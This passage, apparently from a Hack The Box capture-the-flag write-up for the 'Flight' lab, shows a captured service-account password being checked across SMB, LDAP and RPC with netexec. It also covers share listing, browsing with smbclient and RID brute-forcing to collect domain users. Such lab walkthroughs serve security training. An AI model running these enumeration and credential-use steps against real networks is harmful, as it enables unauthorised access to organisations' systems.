<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">5985</span><span class="w">   </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span>
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">5985</span><span class="w">   </span>G0<span class="w">               </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@*t13
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>smb<span class="w"> </span>port<span class="w"> </span><span class="m">445</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">445</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>smb<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@*t13<span class="w"> </span>
</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>
</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ldap<span class="w"> </span>port<span class="w"> </span><span class="m">389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">389</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>ldap<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-33-11"><a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-33-12"><a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@*t13<span class="w"> </span>
</span><span id="__span-33-13"><a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a>
</span><span id="__span-33-14"><a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>rdp<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-33-15"><a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>rdp<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-33-16"><a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a>
</span><span id="__span-33-17"><a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>wmi<span class="w"> </span>port<span class="w"> </span><span class="m">135</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-33-18"><a id="__codelineno-33-18" name="__codelineno-33-18" href="#__codelineno-33-18"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">135</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>wmi<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-33-19"><a id="__codelineno-33-19" name="__codelineno-33-19" href="#__codelineno-33-19"></a>RPC<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">135</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span>
</span><span id="__span-33-20"><a id="__codelineno-33-20" name="__codelineno-33-20" href="#__codelineno-33-20"></a>RPC<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">135</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@*t13<span class="w"> </span>
</span><span id="__span-33-21"><a id="__codelineno-33-21" name="__codelineno-33-21" href="#__codelineno-33-21"></a>
</span><span id="__span-33-22"><a id="__codelineno-33-22" name="__codelineno-33-22" href="#__codelineno-33-22"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>nfs<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-33-23"><a id="__codelineno-33-23" name="__codelineno-33-23" href="#__codelineno-33-23"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>nfs<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-33-24"><a id="__codelineno-33-24" name="__codelineno-33-24" href="#__codelineno-33-24"></a>
</span><span id="__span-33-25"><a id="__codelineno-33-25" name="__codelineno-33-25" href="#__codelineno-33-25"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ssh<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-33-26"><a id="__codelineno-33-26" name="__codelineno-33-26" href="#__codelineno-33-26"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ssh<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-33-27"><a id="__codelineno-33-27" name="__codelineno-33-27" href="#__codelineno-33-27"></a>
</span><span id="__span-33-28"><a id="__codelineno-33-28" name="__codelineno-33-28" href="#__codelineno-33-28"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>vnc<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-33-29"><a id="__codelineno-33-29" name="__codelineno-33-29" href="#__codelineno-33-29"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>vnc<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-33-30"><a id="__codelineno-33-30" name="__codelineno-33-30" href="#__codelineno-33-30"></a>
</span><span id="__span-33-31"><a id="__codelineno-33-31" name="__codelineno-33-31" href="#__codelineno-33-31"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ftp<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-33-32"><a id="__codelineno-33-32" name="__codelineno-33-32" href="#__codelineno-33-32"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ftp<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-33-33"><a id="__codelineno-33-33" name="__codelineno-33-33" href="#__codelineno-33-33"></a>
</span><span id="__span-33-34"><a id="__codelineno-33-34" name="__codelineno-33-34" href="#__codelineno-33-34"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>mssql<span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-33-35"><a id="__codelineno-33-35" name="__codelineno-33-35" href="#__codelineno-33-35"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>mssql<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>closed
</span></code></pre></div>
<p>It seems we can login to:  <code>SMB</code> <code>LDAP</code> <code>RPC</code> services, we will now proceed with their enumeration</p>
<h2 id="smb-enumeration-as-svc_apache">SMB enumeration as svc_apache</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>sequel.htb<span class="w">  </span>-u<span class="w"> </span><span class="s1">&#39;svc_apache&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;S@Ss!K@*t13&#39;</span><span class="w"> </span>--shares
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@*t13<span class="w"> </span>
</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerated<span class="w"> </span>shares
</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Share<span class="w">           </span>Permissions<span class="w">     </span>Remark
</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>-----<span class="w">           </span>-----------<span class="w">     </span>------
</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>ADMIN$<span class="w">                          </span>Remote<span class="w"> </span>Admin
</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>C$<span class="w">                              </span>Default<span class="w"> </span>share
</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>IPC$<span class="w">            </span>READ<span class="w">            </span>Remote<span class="w"> </span>IPC
</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>NETLOGON<span class="w">        </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Shared<span class="w">          </span>READ<span class="w">            </span>
</span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>SYSVOL<span class="w">          </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span><span id="__span-35-12"><a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Users<span class="w">           </span>READ<span class="w">            </span>
</span><span id="__span-35-13"><a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Web<span class="w">             </span>READ
</span></code></pre></div>
<p>Interesting, we have <code>READ</code> permission towards some shares that are non default: <code>Web</code> and other ones that seem valuable like <code>Shared</code> <code>Users</code></p>
<p>Next we can start navigating through these shares and see what we can find:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>smbclient<span class="w"> </span>//flight.htb/Users<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;svc_apache%S@Ss!K@*t13&#39;</span>
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>ls
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="w">  </span>.<span class="w">                                  </span>DR<span class="w">        </span><span class="m">0</span><span class="w">  </span>Thu<span class="w"> </span>Sep<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">15</span>:16:56<span class="w"> </span><span class="m">2022</span>
</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="w">  </span>..<span class="w">                                 </span>DR<span class="w">        </span><span class="m">0</span><span class="w">  </span>Thu<span class="w"> </span>Sep<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">15</span>:16:56<span class="w"> </span><span class="m">2022</span>
</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="w">  </span>.NET<span class="w"> </span>v4.5<span class="w">                           </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Thu<span class="w"> </span>Sep<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">14</span>:28:03<span class="w"> </span><span class="m">2022</span>
</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="w">  </span>.NET<span class="w"> </span>v4.5<span class="w"> </span>Classic<span class="w">                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Thu<span class="w"> </span>Sep<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">14</span>:28:02<span class="w"> </span><span class="m">2022</span>
</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a><span class="w">  </span>Administrator<span class="w">                       </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Mon<span class="w"> </span>Oct<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">13</span>:34:00<span class="w"> </span><span class="m">2022</span>
</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a><span class="w">  </span>All<span class="w"> </span>Users<span class="w">                       </span>DHSrn<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sat<span class="w"> </span>Sep<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">02</span>:28:48<span class="w"> </span><span class="m">2018</span>
</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a><span class="w">  </span>C.Bum<span class="w">                               </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Thu<span class="w"> </span>Sep<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">15</span>:08:23<span class="w"> </span><span class="m">2022</span>
</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a><span class="w">  </span>Default<span class="w">                           </span>DHR<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jul<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">14</span>:20:24<span class="w"> </span><span class="m">2021</span>
</span><span id="__span-37-10"><a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a><span class="w">  </span>Default<span class="w"> </span>User<span class="w">                    </span>DHSrn<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sat<span class="w"> </span>Sep<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">02</span>:28:48<span class="w"> </span><span class="m">2018</span>
</span><span id="__span-37-11"><a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a><span class="w">  </span>desktop.ini<span class="w">                       </span>AHS<span class="w">      </span><span class="m">174</span><span class="w">  </span>Sat<span class="w"> </span>Sep<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">02</span>:16:48<span class="w"> </span><span class="m">2018</span>
</span><span id="__span-37-12"><a id="__codelineno-37-12" name="__codelineno-37-12" href="#__codelineno-37-12"></a><span class="w">  </span>Public<span class="w">                             </span>DR<span class="w">        </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Jul<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">14</span>:23:25<span class="w"> </span><span class="m">2021</span>
</span><span id="__span-37-13"><a id="__codelineno-37-13" name="__codelineno-37-13" href="#__codelineno-37-13"></a><span class="w">  </span>svc_apache<span class="w">                          </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Oct<span class="w"> </span><span class="m">21</span><span class="w"> </span><span class="m">13</span>:50:21<span class="w"> </span><span class="m">2022</span>
</span><span id="__span-37-14"><a id="__codelineno-37-14" name="__codelineno-37-14" href="#__codelineno-37-14"></a>
</span><span id="__span-37-15"><a id="__codelineno-37-15" name="__codelineno-37-15" href="#__codelineno-37-15"></a><span class="w">        </span><span class="m">5056511</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">4096</span>.<span class="w"> </span><span class="m">1190909</span><span class="w"> </span>blocks<span class="w"> </span>available
</span></code></pre></div>
<h2 id="finding-valid-users">Finding valid users</h2>
<p>Enumerate users and groups through smb using rid-brute-forcing</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>flight.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;svc_apache&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;S@Ss!K@*t13&#39;</span><span class="w"> </span>--rid-brute
</span></code></pre></div>
<p>alternatively we could run the <code>--users</code> option for displaying the users only</p>
<p>lets place them on a txt now</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>flight.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;svc_apache&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;S@Ss!K@*t13&#39;</span><span class="w"> </span>--rid-brute<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>SidTypeUser<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">&#39;\&#39;</span><span class="w"> </span>-f2<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">&#39; &#39;</span><span class="w"> </span>-f1<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>users.txt
</span></code></pre></div>
<p>the valid users are:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>Administrator
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>Guest
</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>krbtgt
</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>G0$
</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>S.Moon
</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a>R.Cold
</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a>G.Lors
</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a>L.Kein
</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a>M.Gold
</span><span id="__span-40-10"><a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a>C.Bum
</span><span id="__span-40-11"><a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a>W.Walker
</span><span id="__span-40-12"><a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a>I.Francis
</span><span id="__span-40-13"><a id="__codelineno-40-13" name="__codelineno-40-13" href="#__codelineno-40-13"></a>D.Truff
</span><span id="__span-40-14"><a id="__codelineno-40-14" name="__codelineno-40-14" href="#__codelineno-40-14"></a>V.Stevens
</span><span id="__span-40-15"><a id="__codelineno-40-15" name="__codelineno-40-15" href="#__codelineno-40-15"></a>svc_apache
</span><span id="__span-40-16"><a id="__codelineno-40-16" name="__codelineno-40-16" href="#__codelineno-40-16"></a>O.Possum
</span></code></pre></div>
<p>Also lets inspect if there are any comments with sensitive info in the LDAP description for the users:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>flight.htb<span class="w">  </span>-u<span class="w"> </span><span class="s1">&#39;svc_apache&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;S@Ss!K@*t13&#39;</span><span class="w"> </span>--users
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@*t13<span class="w"> </span>
</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Total<span class="w"> </span>records<span class="w"> </span>returned:<span class="w"> </span><span class="m">15</span>
</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span>-Username-<span class="w">                    </span>-Last<span class="w"> </span>PW<span class="w"> </span>Set-<span class="w">       </span>-BadPW-<span class="w"> </span>-Description-<span class="w">                                               </span>
